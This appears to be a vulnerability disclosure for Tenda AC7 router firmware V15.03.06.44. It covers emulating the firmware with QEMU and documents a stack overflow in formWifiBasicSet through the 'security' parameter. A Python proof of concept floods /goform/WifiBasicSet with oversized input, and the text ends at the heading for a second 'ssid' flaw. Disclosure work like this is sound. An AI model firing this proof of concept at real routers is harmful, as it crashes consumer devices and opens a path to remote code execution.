Overview
--
Experimental environment：ub20

Firmware download website：[AC7 V1.0 升级软件](https://www.tenda.com.cn/material/show/102776)
![image](https://github.com/user-attachments/assets/c15fa54c-802a-45a4-aa5f-18607632f90b)

### Environmental simulation
need build Network bridge:

```text-x-haskell
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

Directly using the httpd in the original firmware will cause the simulation to fail due to the environment check. Here is the patched httpd file (a7__V15.03.06.44_httpd_ok file in this project) (modify the assembly to force skip the environment check step):
https://github.com/Raining-101/IOT_cve/blob/main/a7__V15.03.06.44_httpd_ok

qemu command：

```text-x-haskell
sudo qemu-mipsel-static -L . ./bin/httpd
```

Attacked version
-----

V15.03.06.44

formWifiBasicSet security stackoverflow
---------------------------------------

### Vulnerability Details

A stack-based buffer overflow vulnerability in firmware version TenDa AC7 V15.03.06.44 allows a remote attacker to execute arbitrary code through a stack overflow attack using the security parameter of the formWifiBasicSet function.

formWifiBasicSet

![image](https://github.com/user-attachments/assets/e26eb16c-55bc-4efb-a304-52333fd7ca20)


formWifiBasicSet takes the parameter security from user input, but does not validate the length of user input.

After that, the function copies security directly into param via functions, resulting in a stack overflow vulnerability. strcpy

![image](https://github.com/user-attachments/assets/b8578afc-8f15-4b33-a945-0a7e9480dd61)


### poc

```text-plain
import requests


def calculate_length(data):
    count = 0
    for x, y in data.items():
        count += len(x) + len(y) + 2
    return count - 1


data = {'security': b'R' * 0x1000}

headers = {
    'Host': '192.168.142.100',
    'Content-Length': f'{calculate_length(data)}',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'password=1234',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
    'Accept':
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'close'
}

url = 'http://192.168.142.100/goform/WifiBasicSet'

res = requests.post(url=url, headers=headers, data=data, verify=False)

print(res)
```

![image](https://github.com/user-attachments/assets/c765e381-4c11-4af6-99ed-cf4559816269)

formWifiBasicSet  ssid stackoverflow
------------------------------------

### Vulnerability Details
